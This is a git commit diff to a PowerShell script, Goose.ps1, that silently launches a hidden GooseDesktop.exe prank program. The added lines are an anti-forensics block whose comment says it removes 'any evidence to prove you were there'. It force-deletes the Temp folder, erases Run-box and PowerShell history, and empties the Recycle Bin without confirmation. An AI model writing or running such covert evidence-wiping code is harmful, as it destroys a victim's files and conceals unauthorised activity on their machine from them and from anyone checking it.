722b3a901ef5e5182b81a695b651fd3947253e71
cdneeee <acdne@icloud.com>
2025-01-17 23:08:42 -0500

    GooseGeese

--- Goose.ps1
+++ Goose.ps1
@@ -16,3 +16,26 @@ Set-Location "$extractPath\Goose-main"
 
 # Run GooseDesktop.exe silently
 Start-Process -FilePath ".\GooseDesktop.exe" -WindowStyle Hidden
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+<#
+
+	This is to clean up behind you and remove any evidence to prove you were there
+#>
+
+# Delete contents of Temp folder 
+
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# Delete run box history
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+# Deletes contents of recycle bin
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
